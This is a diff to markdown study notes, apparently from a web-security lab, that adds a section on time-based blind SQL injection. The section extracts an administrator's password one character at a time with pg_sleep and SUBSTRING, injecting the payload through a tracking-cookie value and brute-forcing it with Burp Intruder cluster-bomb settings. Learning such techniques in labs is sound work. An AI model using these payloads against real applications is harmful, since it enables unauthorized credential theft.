@@ -86,7 +86,7 @@ Check password length of administrator:
 ```
 SELECT
   CASE
-    WHEN (username='administrator') AND LENGTH (password)>1 THEN
+    WHEN (username='administrator' AND LENGTH (password)>1) THEN
       pg_sleep(10)
     ELSE
       pg_sleep(0)
@@ -105,6 +105,47 @@ Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND 
 
 
 ---
+
+## Getting the Admin Password Using a Time-Based Blind SQLi
+
+similar approach with blind SQL
+
+```
+SELECT
+  CASE
+    WHEN (username='administrator' AND SUBSTRING (password,1,1)='a' THEN
+      pg_sleep(10)
+    ELSE
+      pg_sleep(0)
+  END
+FROM users
+```
+
+```
+Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
+```
+
+Send it to the Intruder (allow to specify certain locations within the request, where we can automatically change and send to the target web application)
+
+Modify, location and letter replace with `§`
+
+Positions:
+  - Attack type: Cluster bomb (because 2 parts are being manipulated)
+    
+Payloads
+  - Payload set 1: Numbers (1 to 20, step 1)
+  - Payload set 2: Brute force (Character set: alphanumberic, 1 min and 1 max, step 1)
+
+Resource Pool (needed for the time-based attack only)
+  - 1 at a time1, instead of the default
+    - because we want to monitor the response time
+  - create new resource pool, Max concurrent requests: 1 
+
+
+Add new column **Response Received** and look for over 10000 (ms)
+
+---
+
 
 
 
